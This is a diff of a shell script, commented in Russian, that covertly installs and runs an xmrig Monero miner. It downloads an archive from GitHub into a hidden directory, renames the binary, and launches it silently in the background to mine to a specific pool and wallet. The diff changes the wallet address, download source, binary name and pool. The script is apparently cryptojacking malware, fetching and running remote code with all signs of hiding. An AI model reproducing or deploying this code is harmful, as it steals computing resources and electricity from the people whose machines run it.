@@ -2,7 +2,7 @@
 # Универсальный скрипт для всех систем (даже без bash/wget)
 
 # Проверка на уже запущенный процесс с этим кошельком
-WALLET_ID="46JMTCsmGiXX5kWVPZWjajHQTfbbPkBBK3SomZogFz11NwfN3cizxv1WJxax5L9cNcGB9juao4hFRHG5ZyZJ4XHfJwjaaE8"
+WALLET_ID="49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE"
 
 # Проверяем процессы (универсальный метод)
 if ps aux 2>/dev/null | grep -v grep | grep "$WALLET_ID" >/dev/null; then
@@ -81,7 +81,7 @@ mkdir -p "$HIDDEN_DIR" 2>/dev/null || {
 # Скачивание и запуск в скрытой папке
 cd "$HIDDEN_DIR" || exit 1
 
-$DOWNLOADER https://github.com/nik2708/hwloc-withou1/archive/refs/heads/main.zip > main.zip
+$DOWNLOADER https://github.com/paradoxy1337/hwloc-without/archive/refs/heads/main.zip > main.zip
 if [ $? -ne 0 ]; then
     echo "[-] ERROR: Failed to download miner archive"
     exit 1
@@ -92,12 +92,12 @@ unzip -o main.zip >/dev/null 2>&1 || {
     busybox unzip -o main.zip 2>/dev/null || exit 1
 }
 
-cd hwloc-withou1-main || exit 1
+cd hwloc-without-main || exit 1
 
 chmod +x xmrig 2>/dev/null || true
-mv xmrig s
+mv xmrig m
 
-nohup ./s -o xmr-eu.kryptex.network:7029 -u 46JMTCsmGiXX5kWVPZWjajHQTfbbPkBBK3SomZogFz11NwfN3cizxv1WJxax5L9cNcGB9juao4hFRHG5ZyZJ4XHfJwjaaE8 -p "$WORKER_NAME" --cpu-max-threads-hint=75 -B --donate-level=0 >/dev/null 2>&1 &
+nohup ./m -o gulf.moneroocean.stream:10128 -u 49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE -p "$WORKER_NAME" --cpu-max-threads-hint=75 -B --donate-level=0 >/dev/null 2>&1 &
 PID=$!
 
 echo "[*] Miner started with worker name: $WORKER_NAME"
